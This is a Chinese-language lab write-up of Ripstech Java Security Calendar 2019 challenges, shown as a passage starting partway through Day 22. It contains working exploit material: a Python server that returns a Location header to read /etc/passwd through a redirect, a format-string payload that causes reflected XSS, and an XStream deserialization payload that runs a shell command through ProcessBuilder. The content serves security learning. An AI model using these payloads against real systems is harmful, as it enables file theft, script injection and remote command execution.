      Archetype Created Web Application
        day22
        com.ananaskr.day22.ReadExternalUrl
        day22
        /day22
#### 3\. payload构造
首先得实现一个http服务器，使得返回的响应头Location是攻击者可控的。Python实现的http服务器如下所示:  
http.py
    import socket
    from multiprocessing import Process
    def handle_client(client_socket):
        request_data=client_socket.recv(1024)
        response_start_line = "HTTP/1.1 200 OK\r\n"
        response_headers = "Location:file:///etc/passwd#http://www.baidu.com"
        response_body = "Python HTTP Test"
        response = response_start_line+response_headers+"\r\n"+response_body
        client_socket.send(bytes(response,"utf-8"))
        client_socket.close()
    if __name__ == "__main__":
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(("",8888))
        server_socket.listen(128)
        while True:
            client_socket, client_address = server_socket.accept()
            print("[%s, %s] connected" % client_address)
            handle_client_process = Process(target=handle_client, args=(client_socket,))
            handle_client_process.start()
            client_socket.close()
其中，Location里的值为构造的恶意值，可以直接读取到敏感文件。构造完http服务器后，将其放置在服务器上，然后payload为:
    http://localhost:8080/Day22_war_exploded/day22?url=http://your_server_ip:8888/
#### 4\. 结果
# Day23 格式化字符串漏洞
### 代码
Day 23  
### 漏洞点
name。其中name参数进行了escape避免产生XSS。代码的漏洞点在于第18行format()函数易产生格式化字符串漏洞，从calendar对象包含的各个对象调用toString()函数，若有一个对象中存在包含xss
payload的字符串，且拼接的name参数中有%s，则会产生格式化字符串漏洞，从而导致反射XSS漏洞。而第12行创建了一个java.util.SimpleTimeZone对象，该对象接收一个未过滤的用户控制的输入id，该id被添加到Calendar对象中。因此，产生漏洞。
### 复现环境
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 配置web.xml
      Archetype Created Web Application
        day23
        com.ananaskr.ShowCalendar
        day23
        /day23
#### 3\. 修正代码
ShowCalendar.java
    SimpleDateFormat parser=new SimpleDateFormat("EEE MMM d HH:mm:ss zzz yyyy");
    改为
    SimpleDateFormat parser=new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss");
否则会报"java.text.ParseException: Unparseable date"
#### 4\. payload构造
根据前面漏洞点的分析，payload构造如下所示
    day23?id=&current_time=2013-06-28T00:00:00+00:00&name=%shello
将特殊字符进行url编码
    day23?id=&current_time=2013-06-28T00:00:00%2B00:00&name=%25shello
#### 5\. 结果
结果如下所示  
# Day24 对象注入漏洞
### 代码
Day 24  
### 漏洞点
此代码包含一个对象注入漏洞。通过Spring框架的@RequestBody注解将用户输入映射到参数xml上。输入然后被解析为一个org.w3c.dom.Document实例。在解析之后，XPath表达式`//com.ananaskr.day24.User[@serialization='custom'][1]`被用于选择com.ananaskr.day24.User节点。在第17行，此节点被转换为字符串并在第20行Xstream反序列化。
在代码中有2个类，都实现了Serializable接口，意味着这些类的对象可以被序列化。
sink点在第19行Invoker类的readObject方法，这个代码片段允许攻击者创建一个任意的对象，方法是用一个字符串数组调用构造函数，并invoke一个攻击者控制的这个对象的方法(此方法不需要参数)。使用一下payload，我们可以创建ProcessBuilder实例并执行任意shell命令。
因此，对象注入需要反序列化Invoker类，但是Xpath表达式`//com.ananaskr.day24.User[@serialization='custom'][1]`只选择User类。然而，User类的内部还可以有Invoker子类，因此可以绕过此检查，再加之Xstream能序列化任意类，最终导致对象注入。
### 复现过程
#### 1\. 环境
  * IDEA+springmvc
#### 2\. 修正代码(可选)
  * 将第30行的`transient private String password;`改为`transient private Object password;`
  * 将第41行的`password = (String) stream.readObject();`改为`password = stream.readObject();`
  * 不改可能会出现500的错误，但不影响命令执行
#### 3\. 配置web.xml
            encodingFilter
            org.springframework.web.filter.CharacterEncodingFilter
                encoding
                UTF-8
                forceEncoding
                true
            encodingFilter
            /*
            contextConfigLocation
            /WEB-INF/applicationContext.xml
            org.springframework.web.context.ContextLoaderListener
            dispatcher
            org.springframework.web.servlet.DispatcherServlet
            1
            dispatcher
            /
#### 4\. 配置dispatcher-servlet.xml
                /WEB-INF/
                .jsp
#### 5\. 配置applicationContext.xml
#### 6\. payload构造
根据漏洞点的分析，需要在User类中包含Invoker子类。payload如下所示
          PI:EMAIL
          Peter
                touch
                /tmp/abc
              java.lang.ProcessBuilder
              start
过程如图所示  
#### 7\. 结果
# 小结
Ripstech Java Security 2019
Calendar系列的内容都比较简单，适合入门学习。每个day的环境已上传至[github](https://github.com/ananaskr/Java_Calendar_2019)，可供参考。